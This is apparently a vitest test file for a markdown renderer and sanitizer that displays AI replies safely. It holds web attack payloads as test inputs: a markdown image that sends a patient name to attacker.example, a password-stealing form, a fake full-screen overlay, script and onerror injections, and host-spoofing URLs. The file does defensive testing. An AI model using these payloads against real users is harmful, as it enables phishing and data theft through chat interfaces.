import DOMPurify from 'dompurify';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { renderSafeMarkdown, sanitizeReplyHtml } from '../../src/ui/safeMarkdown';

function render(markdown: string): HTMLElement {
  const root = document.createElement('div');
  root.innerHTML = renderSafeMarkdown(markdown);
  return root;
}

function sanitize(html: string): HTMLElement {
  const root = document.createElement('div');
  root.innerHTML = sanitizeReplyHtml(html);
  return root;
}

describe('renderSafeMarkdown — the readiness review payloads', () => {
  it('never loads a markdown image: it becomes a link the end-user can choose to open', () => {
    const root = render('![patient summary](https://attacker.example/c.png?d=PATIENT_NAME)');

    expect(root.querySelector('img')).toBeNull();
    const link = root.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://attacker.example/c.png?d=PATIENT_NAME');
    expect(link?.textContent).toBe('Image: patient summary (attacker.example)');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('shows a raw HTML password form as text, with no form, input or button', () => {
    const root = render(
      '<form action="https://attacker.example/steal" method="post"><input type="password" name="pw"><button>Re-enter password</button></form>',
    );

    expect(root.querySelector('form')).toBeNull();
    expect(root.querySelector('input')).toBeNull();
    expect(root.querySelector('button')).toBeNull();
    expect(root.textContent).toContain('<form action="https://attacker.example/steal"');
  });

  it('shows a raw HTML full-screen overlay as text, with no styled element', () => {
    const root = render(
      '<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">Session expired</div>',
    );

    expect(root.querySelector('div')).toBeNull();
    expect(root.querySelector('[style]')).toBeNull();
    expect(root.textContent).toContain('Session expired');
  });
});

describe('renderSafeMarkdown — raw HTML is text, never markup', () => {
  it('escapes script, img and iframe tags inside a paragraph instead of rendering them', () => {
    const root = render(
      'Hello <script>window.__pwned = true</script> <img src="x" onerror="window.__pwned = true"> <iframe src="https://evil.example/"></iframe>',
    );

    expect(root.querySelector('script, img, iframe')).toBeNull();
    expect(root.querySelectorAll('*').length).toBe(1);
    expect(root.querySelector('p')?.textContent).toContain('<script>');
  });

  it('shows an image with a non-web URL as text only', () => {
    const root = render('![x](javascript:alert(1))');

    expect(root.querySelector('img, a')).toBeNull();
    expect(root.textContent).toContain('Image: x');
  });
});

describe('renderSafeMarkdown — links', () => {
  it('opens web links in a new tab with no opener or referrer, showing the URL on hover', () => {
    const link = render('[Talk2View](https://talk2view.com/docs)').querySelector('a');

    expect(link?.getAttribute('href')).toBe('https://talk2view.com/docs');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.getAttribute('title')).toBe('https://talk2view.com/docs');
  });

  it('keeps a markdown link title instead of the URL', () => {
    const link = render('[docs](https://talk2view.com/docs "Talk2View docs")').querySelector('a');
    expect(link?.getAttribute('title')).toBe('Talk2View docs');
  });

  it('turns bare URLs into new-tab links', () => {
    const link = render('See https://example.com now').querySelector('a');

    expect(link?.getAttribute('href')).toBe('https://example.com');
    expect(link?.getAttribute('target')).toBe('_blank');
  });

  it('keeps mailto links without opening a new tab', () => {
    const link = render('[email us](mailto:help@talk2view.com)').querySelector('a');

    expect(link?.getAttribute('href')).toBe('mailto:help@talk2view.com');
    expect(link?.hasAttribute('target')).toBe(false);
  });

  it('drops javascript:, data: and relative link targets but keeps the text', () => {
    const root = render('[one](javascript:alert(1)) [two](data:text/html,hi) [three](/account/delete)');

    const hrefs = Array.from(root.querySelectorAll('a')).map((a) => a.getAttribute('href'));
    expect(hrefs.every((href) => href === null)).toBe(true);
    expect(root.textContent).toContain('one');
    expect(root.textContent).toContain('two');
    expect(root.textContent).toContain('three');
  });
});

describe('renderSafeMarkdown — the markdown models write still renders', () => {
  it('renders emphasis, headings, lists, blockquotes and rules', () => {
    const root = render('# Title\n\nThis is *italic* and **bold**.\n\n- one\n- two\n\n> quoted\n\n---');

    expect(root.querySelector('h1')?.textContent).toBe('Title');
    expect(root.querySelector('em')?.textContent).toBe('italic');
    expect(root.querySelector('strong')?.textContent).toBe('bold');
    expect(root.querySelectorAll('li').length).toBe(2);
    expect(root.querySelector('blockquote')?.textContent).toContain('quoted');
    expect(root.querySelector('hr')).not.toBeNull();
  });

  it('renders fenced code with its language class and its content as text', () => {
    const root = render('```js\nconst a = "<b>";\n```');

    const code = root.querySelector('pre code');
    expect(code?.getAttribute('class')).toBe('language-js');
    expect(code?.textContent).toContain('const a = "<b>";');
    expect(root.querySelector('b')).toBeNull();
  });

  it('renders tables with column alignment', () => {
    const root = render('| a | b |\n|:-:|--:|\n| 1 | 2 |');

    expect(root.querySelector('th')?.getAttribute('align')).toBe('center');
    expect(root.querySelectorAll('td')[1]?.getAttribute('align')).toBe('right');
  });

  it('renders task lists as disabled checkboxes', () => {
    const boxes = render('- [x] done\n- [ ] todo').querySelectorAll('input');

    expect(boxes.length).toBe(2);
    boxes.forEach((box) => {
      expect(box.getAttribute('type')).toBe('checkbox');
      expect(box.hasAttribute('disabled')).toBe(true);
    });
    expect(boxes[0]?.hasAttribute('checked')).toBe(true);
    expect(boxes[1]?.hasAttribute('checked')).toBe(false);
  });

  it('keeps ordered-list start numbers and line breaks', () => {
    const root = render('3. three\n4. four\n\none\ntwo');

    expect(root.querySelector('ol')?.getAttribute('start')).toBe('3');
    expect(root.querySelector('p br')).not.toBeNull();
  });
});

describe('renderSafeMarkdown — raw HTML after an inline pre/code/kbd/script tag', () => {
  it('escapes text after an inline <code> tag instead of rendering an input', () => {
    const root = render('Hi <code> <input/type=password/name=pw>');

    expect(root.querySelector('input')).toBeNull();
    expect(root.textContent).toContain('<input/type=password/name=pw>');
  });

  it('escapes text after an inline <kbd> tag instead of rendering an anchor', () => {
    const root = render(
      'Hi <kbd> <a/href=HTTPS://evil.example/login target=_self rel=opener>Re-enter password</a>',
    );

    expect(root.querySelector('a')).toBeNull();
  });

  it('escapes text after an inline <kbd> tag instead of rendering a heading', () => {
    const root = render('Hi <kbd> <h1/style=font-size:900px>BIG</h1>');

    expect(root.querySelector('h1')).toBeNull();
  });

  it('escapes an img in a later paragraph after an inline <script> tag, and keeps the state carried text as text', () => {
    const root = render(
      'Use the <script> tag.\n\nLater paragraph <img/src=//evil.example/x.png onerror=alert(1)>',
    );

    expect(root.querySelector('img')).toBeNull();
    const paragraphs = root.querySelectorAll('p');
    expect(paragraphs[1]?.textContent).toContain('<img/src=');
  });

  it('preserves harmless text after an inline <pre> tag instead of silently dropping it', () => {
    const root = render('Wrap output in a <pre> block. Values: x<y, y>z, and AT&T.');

    expect(root.textContent).toContain('Values: x<y, y>z, and AT&T.');
  });
});

describe('sanitizeReplyHtml — the second line of defence', () => {
  it('removes an img element', () => {
    const root = sanitize('<img src="https://evil.example/x.png">');
    expect(root.querySelector('img')).toBeNull();
  });

  it('removes a form and button, and rebuilds a password input as a disabled checkbox with no name', () => {
    const root = sanitize(
      '<form action="https://evil.example"><input type="password" name="pw"><button>Go</button></form>',
    );

    expect(root.querySelector('form')).toBeNull();
    expect(root.querySelector('button')).toBeNull();
    const input = root.querySelector('input');
    expect(input?.getAttribute('type')).toBe('checkbox');
    expect(input?.hasAttribute('disabled')).toBe(true);
    expect(input?.hasAttribute('name')).toBe(false);
  });

  it('removes a style attribute', () => {
    const root = sanitize('<div style="position:fixed">x</div>');
    expect(root.querySelector('[style]')).toBeNull();
  });

  it('removes a style attribute from allowed tags, not just disallowed ones', () => {
    const p = sanitize('<p style="position:fixed;inset:0">x</p>').querySelector('p');
    expect(p).not.toBeNull();
    expect(p?.hasAttribute('style')).toBe(false);

    const a = sanitize('<a href="https://ok.example" style="position:fixed">x</a>').querySelector(
      'a',
    );
    expect(a).not.toBeNull();
    expect(a?.hasAttribute('style')).toBe(false);
  });

  it('strips href, target and rel from a non-web link', () => {
    const root = sanitize('<a href="//evil.example" target="_self" rel="opener">x</a>');
    const link = root.querySelector('a');
    expect(link?.hasAttribute('href')).toBe(false);
    expect(link?.hasAttribute('target')).toBe(false);
    expect(link?.hasAttribute('rel')).toBe(false);
  });

  it('forces a web link to open in a new tab with no opener or referrer', () => {
    const root = sanitize('<a href="https://ok.example" target="_top">x</a>');
    const link = root.querySelector('a');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('rebuilds an image-type input as a disabled checkbox with no src', () => {
    const root = sanitize('<input type="image" src="https://evil.example/i.png">');
    const input = root.querySelector('input');
    expect(input?.getAttribute('type')).toBe('checkbox');
    expect(input?.hasAttribute('disabled')).toBe(true);
    expect(input?.hasAttribute('src')).toBe(false);
  });

  it('drops a class that is not a language-* class on code', () => {
    const root = sanitize('<code class="language-js fixed">x</code>');
    expect(root.querySelector('code')?.hasAttribute('class')).toBe(false);
  });

  it('drops an invalid align value on a table cell', () => {
    const root = sanitize('<table><tr><td align="justify">x</td></tr></table>');
    expect(root.querySelector('td')?.hasAttribute('align')).toBe(false);
  });

  it('removes svg and its animate element with an event attribute', () => {
    const root = sanitize('<svg><animate onbegin="alert(1)" attributeName="x"/></svg>');
    expect(root.querySelector('svg, animate')).toBeNull();
  });

  it('removes an onclick handler from a link', () => {
    const root = sanitize('<a href="https://ok.example" onclick="alert(1)">x</a>');
    expect(root.querySelector('a')?.hasAttribute('onclick')).toBe(false);
  });

  it('removes aria-hidden from a link (F4)', () => {
    const root = sanitize('<a href="https://ok.example" aria-hidden="true">x</a>');
    expect(root.querySelector('a')?.hasAttribute('aria-hidden')).toBe(false);
  });

  it('drops a non-numeric ol start value but keeps a numeric one (F4)', () => {
    const withBadStart = sanitize('<ol start="1/style=position:fixed"><li>x</li></ol>');
    expect(withBadStart.querySelector('ol')?.hasAttribute('start')).toBe(false);

    const withGoodStart = sanitize('<ol start="3"><li>x</li></ol>');
    expect(withGoodStart.querySelector('ol')?.getAttribute('start')).toBe('3');
  });
});

describe('renderSafeMarkdown — a bare <br> passes through inside table cells', () => {
  it('renders an exact <br> as a br element inside table header and body cells', () => {
    const root = render('| a<br>b | c |\n|---|---|\n| 1<br/>2 | 3<BR />4 |');

    expect(root.querySelector('th')?.querySelector('br')).not.toBeNull();
    const cells = root.querySelectorAll('td');
    cells.forEach((cell) => {
      expect(cell.querySelector('br')).not.toBeNull();
    });
    expect(root.textContent).not.toContain('<br');
  });

  it('escapes a br tag with an attribute instead of rendering an element', () => {
    const withOnclick = render('a<br onclick="alert(1)">b');
    expect(withOnclick.querySelector('br')).toBeNull();
    expect(withOnclick.textContent).toContain('<br onclick=');

    const withStyle = render('a<br style="x">b');
    expect(withStyle.querySelector('br')).toBeNull();
    expect(withStyle.textContent).toContain('<br style=');
  });
});

describe('renderSafeMarkdown — a standalone <br> line renders wherever it appears', () => {
  it('renders a br element for a bare <br> line followed by another paragraph', () => {
    const root = render('x\n\n<br>\n\ny');

    expect(root.querySelector('br')).not.toBeNull();
    expect(root.textContent).not.toContain('<br');
  });

  it('keeps a raw tag on the next line as text, with no br or img element', () => {
    const root = render(
      'x\n\n<br>\n<img src=//evil.example/x.png onerror=alert(1)>\n\ny',
    );

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('br')).toBeNull();
    expect(root.textContent).toContain('<img');
  });
});

describe('renderSafeMarkdown — image links match link encoding and alt rendering', () => {
  it('encodes the image href the same way a normal markdown link is encoded', () => {
    const imageHref = render('![x](https://x.example/a.png?a=1&amp;b=2)')
      .querySelector('a')
      ?.getAttribute('href');
    const linkHref = render('[x](https://x.example/a.png?a=1&amp;b=2)')
      .querySelector('a')
      ?.getAttribute('href');

    expect(imageHref).toBe(linkHref);
  });

  it('renders the alt text from parsed markdown tokens, not the raw source', () => {
    const link = render('![**bold** \\_alt\\_](https://x.example/a.png)').querySelector('a');
    expect(link?.textContent).toBe('Image: bold _alt_ (x.example)');
  });

  it('keeps the existing payload label', () => {
    const link = render(
      '![patient summary](https://attacker.example/c.png?d=PATIENT_NAME)',
    ).querySelector('a');
    expect(link?.textContent).toBe('Image: patient summary (attacker.example)');
  });
});

describe('renderSafeMarkdown — image link labels name the real host', () => {
  it('labels https://evil.example&sol;@talk2view.com/x.png with the host it actually opens', () => {
    const link = render('![x](https://evil.example&sol;@talk2view.com/x.png)').querySelector('a');
    expect(link).not.toBeNull();
    const actualHost = new URL(link!.href).host;
    expect(link?.textContent).toBe(`Image: x (${actualHost})`);
    expect(actualHost).toBe('evil.example');
  });

  it('labels https://talk2view.com&#64;evil.example/x.png with the host it actually opens', () => {
    const link = render('![x](https://talk2view.com&#64;evil.example/x.png)').querySelector('a');
    expect(link).not.toBeNull();
    const actualHost = new URL(link!.href).host;
    expect(link?.textContent).toBe(`Image: x (${actualHost})`);
    expect(actualHost).toBe('evil.example');
  });

  it('labels https://talk2view.com@evil.example/x.png with the host it actually opens', () => {
    const link = render('![x](https://talk2view.com@evil.example/x.png)').querySelector('a');
    expect(link).not.toBeNull();
    const actualHost = new URL(link!.href).host;
    expect(link?.textContent).toBe(`Image: x (${actualHost})`);
    expect(actualHost).toBe('evil.example');
  });

  it('keeps the title in sync with the href, with neither double-encoding &amp;', () => {
    const link = render('![x](https://x.example/a.png?a=1&amp;b=2)').querySelector('a');
    expect(link?.getAttribute('title')).toBe(link?.getAttribute('href'));
    expect(link?.getAttribute('title')).not.toContain('&amp;');
    expect(link?.getAttribute('href')).not.toContain('&amp;');
  });
});

describe('renderSafeMarkdown — isolation and fallback', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.resetModules();
  });

  it("doesn't change the host app's own DOMPurify", () => {
    renderSafeMarkdown('[x](https://example.com)');
    const hostOutput = DOMPurify.sanitize('<a href="https://example.com">x</a>');

    expect(hostOutput).not.toContain('target=');
    expect(hostOutput).not.toContain('rel=');
  });

  it('returns escaped text, never unsanitized HTML, when there is no DOM', async () => {
    vi.resetModules();
    vi.stubGlobal('window', undefined);
    const { renderSafeMarkdown: renderWithoutDom } = await import('../../src/ui/safeMarkdown');

    expect(renderWithoutDom('<img src=x onerror=alert(1)> **hi**')).toBe(
      '&lt;img src=x onerror=alert(1)&gt; **hi**',
    );
  });
});
